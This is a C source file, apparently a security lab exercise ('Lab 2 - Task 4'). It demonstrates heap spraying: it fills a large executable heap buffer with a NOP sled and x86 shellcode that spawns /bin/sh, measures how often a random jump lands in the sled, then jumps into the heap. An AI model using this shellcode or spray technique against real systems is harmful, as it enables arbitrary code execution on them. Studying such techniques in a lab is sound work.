//Lab 2 - Task 4

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/mman.h>

int main (int argc, char** argv)
{
  int NOPSize = 650;  //Set the length of your NOP sled (in bytes) here
  int ShellcodeSize = 26;  //Set the length of your shellcode (in bytes) here
  int PayloadSize = NOPSize + ShellcodeSize;
  char Payload[PayloadSize];
  char Shellcode[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x51\xb0\x01\xcd\x80";  //Insert your shellcode here
  char* HeapBuf = (char*)malloc(0x8000000);  //134,217,728 (128MB)
  int* Address;
  
  //Insert your call to mprotect() here
  mprotect(HeapBuf-8, (0x8000000+0x1000), PROT_READ | PROT_WRITE | PROT_EXEC);
  for (int x = 0; x <= PayloadSize; x++)
  {
    if (x <= NOPSize) {Payload[x] = '\x90';}
		else {Payload[x] = Shellcode[x - NOPSize - 1];}
  }

  for (int x = 0; x < 0x8000000; x++)
    HeapBuf[x] = Payload[x % PayloadSize + 1];
  
  srand(time(NULL));
  
  int Success = 0;
  int Failure = 0;
  int Attempts = 10000;
  double SuccessRate = 0.0;
  
  for (int x = 0; x < Attempts; x++)
  {
    Address = (int*)((((int)HeapBuf + 1 + (rand() % 0x8000000))+3) & ~3);
    (*Address == 0x90909090) ? Success++ : Failure++;
  }
  
  SuccessRate = (double)Success/Attempts*100;
  printf("Simulating %d attempts to successfully jump into the NOP sled\n", Attempts);	
  printf("Successes: %d\n", Success);
  printf("Failures: %d\n", Failure);
  printf("Success Rate: %2.2f\%\n\n", SuccessRate);
  
  Address = (int*)((((int)HeapBuf + 1 + (rand() % 0x6400000))+3) & ~3);
  printf("Random Address: %p\n", Address);
  printf("Contents of Random Address: %p\n", *Address);
  printf("Preparing for jump to Heaperspace!\n");
  asm(".byte 0xFF, 0x55, 0xAC");  //Opcodes for call [ebp-0x54] because AT&T syntax is fucking awful
  
  free(HeapBuf);
}